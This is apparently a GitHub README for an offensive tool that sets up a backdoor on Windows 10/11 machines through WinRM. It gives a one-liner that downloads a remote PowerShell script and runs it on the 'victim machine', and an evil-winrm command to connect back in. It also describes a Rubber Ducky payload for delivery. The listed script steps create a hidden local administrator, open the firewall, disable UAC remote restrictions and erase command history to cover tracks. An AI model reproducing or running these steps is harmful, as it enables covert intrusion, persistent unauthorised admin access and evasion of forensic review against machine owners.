# Win-RM Reverse Shell

## Introduction
This repository provides a PowerShell script to establish a reverse shell connection via Windows Remote Management (WinRM) on Windows 10/11. Additionally it includes a Rubber Ducky payload for alternative deployment.

## Dependencies
- Both attacker and victim must be on the same network for the connection to be established successfully.
- Ensure you have administrative access to the target machine.

## Usage
1. Edit `WinRM.ps1`:
   - Set your desired username and password by modifying the variables `$Username` and `$Password`.
2. Run the following PowerShell one-liner on the victim machine with administrative privileges:
   ```powershell
   IEX (IWR "https://raw.githubusercontent.com/VBV11/WinRM-Reverse-Shell/main/WinRM.ps1")

## Use Evil-WinRM to connect to the victim machine:
evil-winrm -i YOUR.IP.ADDRESS -u Admin -p Password1

# ![Screenshot_2024-02-25_13-40-13 (1)](https://github.com/VBV11/WinRM-Reverse-Shell/assets/104235290/446782ec-8fcf-46ac-adf1-10f54711bf73)


## Rubber Ducky Payload
The repository includes a Rubber Ducky payload for alternative deployment.
Edit the payload speed and URL as needed.

https://github.com/VBV11/WinRM-Reverse-Shell/assets/104235290/fa37438d-69cc-4969-8866-dc02a3437dec

## Additional Information
The created user account can be viewed in User Accounts.
To view the account, type netplwiz in the Run box.

+ Account information may also be visible on the login screen.

![image](https://github.com/VBV11/WinRM-Reverse-Shell/assets/104235290/8ee30db3-aee3-4720-9d75-228fd26a6aec)


![image](https://github.com/VBV11/WinRM-Reverse-Shell/assets/104235290/2d0a0ada-3810-4cc3-9e8a-338c4ef3079d)

## Script Breakdown
### The PowerShell script is divided into several parts:

#### Function to hide a window.
#### Creation of a new local user account.
#### Addition of the new user to the local Administrators group.
#### Enabling of Windows Remote Management (WinRM).
#### Adding a firewall rule to allow WinRM traffic.
#### Disabling UAC remote restrictions.
#### Deletion of run box history and PowerShell history.

## Credits
### Inspired by TW-D.
